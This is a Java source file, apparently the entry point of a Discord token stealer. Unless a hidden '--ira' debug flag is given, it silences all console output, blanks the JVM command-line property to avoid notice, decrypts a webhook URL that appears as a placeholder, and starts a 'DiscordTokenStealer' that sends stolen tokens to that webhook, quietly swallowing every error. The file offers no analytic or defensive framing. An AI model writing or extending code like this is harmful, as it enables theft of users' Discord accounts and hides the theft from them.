import java.io.PrintStream;
import java.io.OutputStream;

public class EntryPoint {

    private static final byte[] WEBHOOK_KEY = new byte[3];

    public static void main(String[] args) {
        boolean debugMode = false;

        for (String arg : args) {
            if (arg.equalsIgnoreCase("--ira")) {
                debugMode = true;
                break;
            }
        }

        if (!debugMode) {
            try {
                PrintStream nullStream = new PrintStream(new OutputStream() {
                    public void write(int b) {}
                });
                System.setOut(nullStream);
                System.setErr(nullStream);

                System.setProperty("sun.java.command", "   ");
            } catch (Throwable ignored) {}
        }

        String webhookUrl = decryptWebhookUrl();

        if (debugMode) {
            System.out.println("[EntryPoint] Debug mode active");
            System.out.println("[EntryPoint] Webhook: " + webhookUrl);
            return;
        }

        try {

            DiscordTokenStealer stealer = new DiscordTokenStealer(webhookUrl, false, args);
            stealer.start();
        } catch (Throwable ignored) {}
    }

    private static String decryptWebhookUrl() {

        return "<WEBHOOK_URL_DECRYPTED_AT_RUNTIME>";
    }
}